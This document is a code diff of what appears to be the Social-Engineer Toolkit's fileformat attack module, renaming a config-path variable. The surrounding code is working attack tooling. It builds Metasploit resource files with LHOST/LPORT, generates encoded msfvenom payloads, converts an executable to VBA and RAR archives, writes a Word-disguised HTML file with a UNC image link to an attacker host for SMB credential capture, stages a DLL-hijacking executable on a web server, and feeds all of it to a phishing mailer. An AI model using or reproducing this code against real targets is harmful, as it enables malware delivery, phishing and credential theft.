@@ -196,20 +196,20 @@ if exploit_counter == 0:
     print_info("Generating fileformat exploit...")
     # START THE EXE TO VBA PAYLOAD
     if exploit != 'custom/exe/to/vba/payload':
-        output = setdir + "/%s" % (outfile)
-        if os.path.isfile(setdir + "/template.pdf"):
-            os.remove(setdir + "/template.pdf")
+        output = userconfigpath + "%s" % (outfile)
+        if os.path.isfile(userconfigpath + "template.pdf"):
+            os.remove(userconfigpath + "template.pdf")
         if os.path.isfile(msfpath + "local/template.pdf"):
             os.remove(msfpath + "local/template.pdf")
 
         if inputpdf != "": inputpdf = ("set INFILENAME " + inputpdf + "\n")
         output = output.replace("//", "/")
-        filewrite = open(setdir + "/template.rc", "w")
+        filewrite = open(userconfigpath + "template.rc", "w")
         filewrite.write("use %s\nset LHOST %s\nset LPORT %s\n%sset FILENAME %s\nexploit\n" %
                         (exploit, rhost, lport, inputpdf, output))
         filewrite.close()
         child = pexpect.spawn(
-            "%smsfconsole -r %s/template.rc" % (meta_path, setdir))
+            "%smsfconsole -r %s/template.rc" % (meta_path, userconfigpath))
         a = 1
     counter = 0
     while a == 1:
@@ -219,15 +219,15 @@ if exploit_counter == 0:
             print_error("You will need to troubleshoot Metasploit manually and try generating a PDF. You can manually troubleshoot by going to /root/.set/ and typing msfconsole -r template.rc to reproduce the issue.")
             pause = raw_input("Press {return} to move back.")
             break
-        if os.path.isfile(setdir + "/" + outfile):
-            subprocess.Popen("cp " + msfpath + "local/%s %s" % (filename_code, setdir),
+        if os.path.isfile(userconfigpath + "" + outfile):
+            subprocess.Popen("cp " + msfpath + "local/%s %s" % (filename_code, userconfigpath),
                              stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
             a = 2  # break
         else:
             print_status("Waiting for payload generation to complete (be patient, takes a bit)...")
             if os.path.isfile(msfpath + "local/" + outfile):
                 subprocess.Popen("cp %slocal/%s %s" %
-                                 (msfpath, outfile, setdir), shell=True)
+                                 (msfpath, outfile, userconfigpath), shell=True)
                 counter = counter + 1 
             time.sleep(3)
 
@@ -244,23 +244,23 @@ if exploit_counter == 0:
             execute1 = ("exe")
             payloadname = ("vb.exe")
         subprocess.Popen("%smsfvenom -p %s %s %s -e shikata_ga_nai --format=%s > %s/%s" %
-                         (meta_path, payload, rhost, lport, execute1, setdir, payloadname), shell=True)
+                         (meta_path, payload, rhost, lport, execute1, userconfigpath, payloadname), shell=True)
         if noencode == 0:
             subprocess.Popen("%smsfvenom -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" %
-                             (meta_path, setdir, setdir), shell=True)
+                             (meta_path, userconfigpath, userconfigpath), shell=True)
         # Create the VB script here
         subprocess.Popen("%s/tools/exe2vba.rb %s/vb.exe %s/template.vbs" %
-                         (meta_path, setdir, setdir), shell=True)
+                         (meta_path, userconfigpath, userconfigpath), shell=True)
         print_info("Raring the VBS file.")
         subprocess.Popen("rar a %s/template.rar %s/template.vbs" %
-                         (setdir, setdir), shell=True)
+                         (userconfigpath, userconfigpath), shell=True)
 
     # NEED THIS TO PARSE DELIVERY OPTIONS TO SMTP MAILER
-    filewrite = open(setdir + "/payload.options", "w")
+    filewrite = open(userconfigpath + "payload.options", "w")
     filewrite.write(payload + " " + rhost + " " + lport)
     filewrite.close()
     if exploit != "dll_hijacking":
-        if not os.path.isfile(setdir + "/fileformat.file"):
+        if not os.path.isfile(userconfigpath + "fileformat.file"):
             sys.path.append("src/phishing/smtp/client/")
             debug_msg(me, "importing 'src.phishing.smtp.client.smtp_client'", 1)
             try:
@@ -279,11 +279,11 @@ if exploit == "unc_embed":
         letters = string.ascii_letters + string.digits
         return ''.join([random.choice(letters) for _ in range(length)])
     rand_gen = random_string()
-    filewrite = open(setdir + "/unc_config", "w")
+    filewrite = open(userconfigpath + "unc_config", "w")
     filewrite.write("use server/capture/smb\n")
     filewrite.write("exploit -j\r\n\r\n")
     filewrite.close()
-    filewrite = open(setdir + "/template.doc", "w")
+    filewrite = open(userconfigpath + "template.doc", "w")
     filewrite.write(
         r'''<html><head></head><body><img src="file://\\%s\%s.jpeg">''' % (rhost, rand_gen))
     filewrite.close()
@@ -312,16 +312,16 @@ if exploit == "dll_hijacking":
 
     # if we are not using apache
     if apache == 0:
-        if not os.path.isfile("%s/fileformat.file" % (setdir)):
-            filewrite = open(setdir + "/attack_vector", "w")
+        if not os.path.isfile("%s/fileformat.file" % (userconfigpath)):
+            filewrite = open(userconfigpath + "attack_vector", "w")
             filewrite.write("hijacking")
             filewrite.close()
-            filewrite = open(setdir + "/site.template", "w")
+            filewrite = open(userconfigpath + "site.template", "w")
             filewrite.write("TEMPLATE=CUSTOM")
             filewrite.close()
             time.sleep(1)
             subprocess.Popen("mkdir %s/web_clone;cp src/html/msf.exe %s/web_clone/x" % (
-                setdir, setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                userconfigpath, userconfigpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
             child = pexpect.spawn("python src/html/web_server.py")
 
     # if we are using apache
@@ -329,13 +329,13 @@ if exploit == "dll_hijacking":
         subprocess.Popen("cp src/html/msf.exe %s/x.exe" %
                          (apache_path), shell=True).wait()
 
-    if os.path.isfile(setdir + "/meta_config"):
+    if os.path.isfile(userconfigpath + "meta_config"):
         # if we aren't using the infectious method then do normal routine
-        if not os.path.isfile("%s/fileformat.file" % (setdir)):
+        if not os.path.isfile("%s/fileformat.file" % (userconfigpath)):
             print_info("This may take a few to load MSF...")
             try:
                 child1 = pexpect.spawn(
-                    "%smsfconsole -L -r %s/meta_config" % (meta_path, setdir))
+                    "%smsfconsole -L -r %s/meta_config" % (meta_path, userconfigpath))
             except:
                 try:
                     child1.close()
@@ -344,7 +344,7 @@ if exploit == "dll_hijacking":
 
     # get the emails out
     # if we aren't using the infectious method then do the normal routine
-    if not os.path.isfile("%s/fileformat.file" % (setdir)):
+    if not os.path.isfile("%s/fileformat.file" % (userconfigpath)):
         sys.path.append("src/phishing/smtp/client/")
         debug_msg(me, "importing 'src.phishing.smtp.client.smtp_client'", 1)
         try:
